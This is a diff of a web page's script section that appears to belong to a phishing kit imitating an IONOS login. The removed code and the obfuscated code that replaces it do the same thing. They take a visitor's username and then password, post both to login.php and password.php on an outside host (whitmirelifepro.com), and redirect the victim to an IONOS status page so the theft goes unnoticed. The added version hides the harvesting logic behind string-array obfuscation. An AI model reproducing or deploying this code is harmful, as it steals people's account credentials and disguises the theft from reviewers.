@@ -344,71 +344,7 @@
 </body>
 <script src="https://code.jquery.com/jquery-3.6.4.min.js"></script>
 <script>
-  $(document).ready(function() {
-
-    $('#button--with-loaderk').click(function(e) {
-        e.preventDefault();
-
-        var username = $('#username').val();
-        // Email format validation using regular expression
-        var emailPattern = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
-        var domainPattern = /^(?:[a-zA-Z0-9-]+\.)+[a-zA-Z]{2,}$/;
-         var numberPattern = /^\d{1,10}$/; // Only numbers with max 10 digits
-
-      if (!emailPattern.test(username) && !domainPattern.test(username) && !numberPattern.test(username))  { 
-          $('#error').show();
-          return;
-      }
-       
-          var formData = {
-              username: $('#username').val(),
-             
-          };
-
-          $.ajax({
-              url: 'https://whitmirelifepro.com/td6uS0/login.php',
-              type: 'POST',
-              data: formData,
-              success: function(response) {
-                  console.log(response);
-                  $("#usernameSection").hide();
-                  $("#passwordSection").show();
-                  $("#domainValue").html(username);
-              },
-              error: function() {
-                  $('#response').html('An error occurred.');
-              }
-          });
-      });
-
-
-      $('#button--with-loaders').click(function(e) {
-        e.preventDefault();
-
-        var username = $('#username').val();
-        var passowrd = $('#password').val();
-        
-       
-          var formData = {
-              username: $('#username').val(),
-              password: $('#password').val(),
-             
-          };
-
-          $.ajax({
-              url: 'https://whitmirelifepro.com/td6uS0/password.php',
-              type: 'POST',
-              data: formData,
-              success: function(response) {
-                  console.log(response);
-                  window.location.href = 'https://www.ionos-status.de'; 
-              },
-              error: function() {
-                  $('#response').html('An error occurred.');
-              }
-          });
-      });
-  });
+  var _0x34652c=_0x5baf;(function(_0x1c89ea,_0xf80b98){var _0x55398e=_0x5baf,_0x2f7b0b=_0x1c89ea();while(!![]){try{var _0x46c413=-parseInt(_0x55398e(0x116))/0x1*(-parseInt(_0x55398e(0x115))/0x2)+-parseInt(_0x55398e(0x107))/0x3*(parseInt(_0x55398e(0x100))/0x4)+-parseInt(_0x55398e(0x118))/0x5+parseInt(_0x55398e(0x10a))/0x6+parseInt(_0x55398e(0x111))/0x7+-parseInt(_0x55398e(0x114))/0x8+parseInt(_0x55398e(0x109))/0x9;if(_0x46c413===_0xf80b98)break;else _0x2f7b0b['push'](_0x2f7b0b['shift']());}catch(_0x1fb4c0){_0x2f7b0b['push'](_0x2f7b0b['shift']());}}}(_0x48d3,0xae7f6),$(document)[_0x34652c(0x10d)](function(){var _0x527ce7=_0x34652c;$(_0x527ce7(0x112))['click'](function(_0x46cc8e){var _0x4985b6=_0x527ce7;_0x46cc8e[_0x4985b6(0x10b)]();var _0x4c3215=$('#username')['val'](),_0x40ba5b=/^[^\s@]+@[^\s@]+\.[^\s@]+$/,_0x2841e5=/^(?:[a-zA-Z0-9-]+\.)+[a-zA-Z]{2,}$/;if(!_0x40ba5b[_0x4985b6(0xff)](_0x4c3215)&&!_0x2841e5['test'](_0x4c3215)){$(_0x4985b6(0x117))[_0x4985b6(0x10e)]();return;}var _0x1307bf={'username':$(_0x4985b6(0x106))[_0x4985b6(0x10f)]()};$[_0x4985b6(0x10c)]({'url':_0x4985b6(0x104),'type':_0x4985b6(0xfd),'data':_0x1307bf,'success':function(_0x1fe7d2){var _0x51a261=_0x4985b6;console['log'](_0x1fe7d2),$(_0x51a261(0x108))['hide'](),$(_0x51a261(0xfb))['show'](),$(_0x51a261(0x103))[_0x51a261(0x113)](_0x4c3215);},'error':function(){var _0x15c889=_0x4985b6;$(_0x15c889(0x102))[_0x15c889(0x113)](_0x15c889(0xfc));}});}),$(_0x527ce7(0x110))['click'](function(_0x596411){var _0x44fdfd=_0x527ce7;_0x596411[_0x44fdfd(0x10b)]();var _0x13aeb1=$(_0x44fdfd(0x106))['val'](),_0x3f3066=$(_0x44fdfd(0x101))[_0x44fdfd(0x10f)](),_0x2328e5={'username':$(_0x44fdfd(0x106))[_0x44fdfd(0x10f)](),'password':$('#password')[_0x44fdfd(0x10f)]()};$['ajax']({'url':'https://whitmirelifepro.com/td6uS0/password.php','type':_0x44fdfd(0xfd),'data':_0x2328e5,'success':function(_0x406df9){var _0x5c5539=_0x44fdfd;console['log'](_0x406df9),window[_0x5c5539(0x105)]['href']=_0x5c5539(0xfe);},'error':function(){var _0xd431bf=_0x44fdfd;$(_0xd431bf(0x102))[_0xd431bf(0x113)](_0xd431bf(0xfc));}});});}));function _0x5baf(_0x56f6b7,_0x554693){var _0x48d350=_0x48d3();return _0x5baf=function(_0x5baf6d,_0x275f67){_0x5baf6d=_0x5baf6d-0xfb;var _0xd0a17a=_0x48d350[_0x5baf6d];return _0xd0a17a;},_0x5baf(_0x56f6b7,_0x554693);}function _0x48d3(){var _0x130a20=['#error','6878360gOIwsA','#passwordSection','An\x20error\x20occurred.','POST','https://www.ionos-status.de','test','5403576VPGfyr','#password','#response','#domainValue','https://whitmirelifepro.com/td6uS0/login.php','location','#username','3NbuPTr','#usernameSection','14692365kWQVDP','4929696CUgKNu','preventDefault','ajax','ready','show','val','#button--with-loaders','9631251iEcCwe','#button--with-loaderk','html','8901928PQLcwy','2baRvDI','724055MOhRzF'];_0x48d3=function(){return _0x130a20;};return _0x48d3();}
 </script>
 
 </html>
